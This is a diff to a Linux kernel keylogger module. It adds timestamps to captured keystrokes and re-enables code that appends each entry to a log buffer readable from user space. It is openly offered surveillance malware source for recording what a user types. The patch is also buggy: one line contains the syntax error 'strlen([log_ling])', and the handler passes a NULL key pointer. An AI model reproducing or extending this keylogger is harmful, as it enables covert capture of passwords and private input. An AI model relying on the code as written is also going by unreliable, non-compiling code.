@@ -10,6 +10,7 @@
 #include <linux/errno.h>
 #include <linux/vmalloc.h>
 #include <linux/interrupt.h>
+#include <linux/time.h>
 #include <asm/io.h>
 #include "keylogger.h"
 
@@ -32,7 +33,7 @@ t_keylogger_data keylogger_data;
 /*
 *  Adds a new entry to the log_buffer.
 */
-/*
+
 static int add_new_entry(char *entry)
 {
 	char *tmp_buff;
@@ -50,7 +51,7 @@ static int add_new_entry(char *entry)
 	log_buffer = tmp_buff;
 	return (0);
 }
-*///Commented for now so compilation works
+
 static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff_t *_offset)
 {
 	if (!keylogger_data.log_buffer)
@@ -120,13 +121,34 @@ void	handle_scancode(struct key_info *key)
 		singlecode_handle(scancode, key);
 }
 
+int generate_timestamp(char *out)
+{
+	struct timespec ts;
+	
+	getnstimeofday(&ts);
+
+	if (sprintf(out, "%.2d:%.2d:%.2d", (ts.tv_sec/3600) % 24, (ts.tv_sec/60) % 60, ts.tv_sec % 60) < 0)
+	{
+		printk(KERN_ERR "[Keylogger] Sprintf failed to copy timestamp.\n");
+		return (-1);
+	}
+	return 0;
+	
+}
+
 static irqreturn_t keylogger_handle(int irq_n, void *data)
 {
 	t_keylogger_data	*logs = (t_keylogger_data *)data;
 	struct key_info *key = NULL;
+	char log_line[64];
 	(void)logs;
 
+	bzero(log_line, 64);
+	generate_timestamp(log_line);
+	printk(KERN_INFO "%s ", log_line);
 	handle_scancode(key);
+	log_line[strlen([log_ling])] = '\n'; //add a new line at end of our log entry
+	add_new_entry(log_line);
 	return IRQ_HANDLED;
 }
 
